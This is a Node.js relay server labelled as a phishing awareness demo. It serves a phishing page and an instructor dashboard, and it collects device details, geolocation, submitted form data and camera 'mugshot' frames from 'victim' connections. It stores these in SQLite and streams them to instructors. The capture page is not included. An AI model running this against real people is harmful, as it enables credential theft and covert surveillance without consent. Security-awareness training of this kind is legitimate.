// relay.js — CSA Phishing Awareness Demo · Unified Relay Server v2.1
// ─────────────────────────────────────────────────────────────────────
// Unified server: Handles WebSockets, REST API, and Static HTML files.
// ─────────────────────────────────────────────────────────────────────

'use strict';

const { WebSocketServer } = require('ws');
const fs = require('fs');
const path = require('path');
const http = require('http');
const Database = require('better-sqlite3');

// ── CONFIG ────────────────────────────────────────────────────────────
const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT) : 8765;
const TRUST_PROXY = process.env.TRUST_PROXY !== 'false';
const LOG_FILE = path.join(__dirname, 'relay.log');
const DB_FILE = path.join(__dirname, 'sessions.db');

// Session label
const DEFAULT_SESSION = process.env.SESSION_ID || new Date().toISOString().slice(0, 16).replace(':', '-');

// Instructor tokens
const INSTRUCTOR_TOKENS = {
  'CSA-DEMO-2026': 'default',
  'CSA-AM-2026': 'session_AM',
  'CSA-PM-2026': 'session_PM',
};

// ── LOGGING ───────────────────────────────────────────────────────────
function ts() { return new Date().toISOString(); }
function log(msg) {
  const line = `[${ts()}] ${msg}`;
  console.log(line);
  fs.appendFileSync(LOG_FILE, line + '\n');
}

// ── DATABASE ──────────────────────────────────────────────────────────
const db = new Database(DB_FILE);
db.pragma('journal_mode = WAL');
db.exec(`
  CREATE TABLE IF NOT EXISTS victims (
    client_id TEXT PRIMARY KEY,
    session_id TEXT,
    ip TEXT,
    connected_at TEXT,
    device_json TEXT,
    location_json TEXT,
    form_json TEXT,
    last_frame_at TEXT,
    mugshot_url TEXT
  );
`);

const stmtUpsertVictim = db.prepare(`INSERT OR IGNORE INTO victims (client_id, session_id, ip, connected_at) VALUES (?, ?, ?, ?)`);
const stmtUpdateDevice = db.prepare(`UPDATE victims SET device_json = ? WHERE client_id = ?`);
const stmtUpdateLoc    = db.prepare(`UPDATE victims SET location_json = ? WHERE client_id = ?`);
const stmtUpdateForm   = db.prepare(`UPDATE victims SET form_json = ? WHERE client_id = ?`);
const stmtUpdateFrame  = db.prepare(`UPDATE victims SET last_frame_at = ? WHERE client_id = ?`);

// ── REGISTRY & ROUTING ───────────────────────────────────────────────
const instructorRooms = new Map();
const victimSockets   = new Set();

function addInstructor(ws, room) {
  if (!instructorRooms.has(room)) instructorRooms.set(room, new Set());
  instructorRooms.get(room).add(ws);
}
function removeInstructor(ws, room) {
  if (instructorRooms.has(room)) instructorRooms.get(room).delete(ws);
}
function broadcastAll(payload) {
  const str = JSON.stringify(payload);
  for (const rooms of instructorRooms.values()) {
    for (const ins of rooms) { if (ins.readyState === 1) ins.send(str); }
  }
}
function broadcastToVictims(payload) {
  const str = JSON.stringify(payload);
  for (const v of victimSockets) { if (v.readyState === 1) v.send(str); }
}

// ── UNIFIED HTTP SERVER ──────────────────────────────────────────────
const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;

  // CORS Helpers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

  // 1. API Endpoints
  if (pathname === '/api/sessions') {
    const rows = db.prepare('SELECT DISTINCT session_id FROM victims').all();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ sessions: rows }));
  }
  if (pathname.startsWith('/api/sessions/')) {
    const sid = pathname.split('/').pop();
    const rows = db.prepare('SELECT * FROM victims WHERE session_id = ?').all(sid);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ session_id: sid, victims: rows }));
  }

  // 2. Static HTML Serving
  let filePath = '';
  if (pathname === '/' || pathname === '/phish' || pathname === '/phish.html') {
    filePath = path.join(__dirname, 'phish.html');
  } else if (pathname === '/instructor' || pathname === '/admin' || pathname === '/instructor.html') {
    filePath = path.join(__dirname, 'instructor.html');
  }

  if (filePath && fs.existsSync(filePath)) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return fs.createReadStream(filePath).pipe(res);
  }

  res.writeHead(404);
  res.end('Not Found');
});

// ── WEBSOCKET SERVER ──────────────────────────────────────────────────
const wss = new WebSocketServer({ server });
let clientCounter = 0;

wss.on('connection', (ws, req) => {
  const ip = (TRUST_PROXY && req.headers['x-forwarded-for']) ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
  const clientId = `client_${Date.now()}_${++clientCounter}`;
  let role = 'victim';
  let room = null;

  victimSockets.add(ws);
  stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
  log(`[+] CONNECT     ${clientId}  IP=${ip}`);

  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw);
      
      // Instructor Registration
      if (msg.type === 'register' && msg.role === 'instructor') {
        if (INSTRUCTOR_TOKENS[msg.token]) {
          role = 'instructor';
          room = INSTRUCTOR_TOKENS[msg.token];
          victimSockets.delete(ws);
          addInstructor(ws, room);
          ws.send(JSON.stringify({ type: 'auth_ok', clientId, room, session_id: DEFAULT_SESSION }));
          log(`[!] AUTH OK     ${clientId} as Instructor (Room: ${room})`);
        } else {
          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Invalid token' }));
        }
        return;
      }

      // Telemetry Handling
      if (msg.type === 'device_info') {
        stmtUpdateDevice.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'location') {
        stmtUpdateLoc.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'form_data') {
        stmtUpdateForm.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'frame' || msg.type === 'mugshot') {
        stmtUpdateFrame.run(ts(), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'config_update' && role === 'instructor') {
        broadcastToVictims(msg);
      }

    } catch (e) { log(`[!] MSG ERROR   ${clientId}  ${e.message}`); }
  });

  ws.on('close', () => {
    log(`[-] DISCONNECT  ${clientId}`);
    victimSockets.delete(ws);
    if (role === 'instructor' && room) removeInstructor(ws, room);
  });
});

log(`=== CSA Unified Relay v2.1 ===`);
log(`Port      : ${WS_PORT}`);
log(`Session   : ${DEFAULT_SESSION}`);
log(`URLs:`);
log(`  - Phish : http://localhost:${WS_PORT}/phish`);
log(`  - Admin : http://localhost:${WS_PORT}/instructor`);
log('───────────────────────────────\n');

server.listen(WS_PORT);
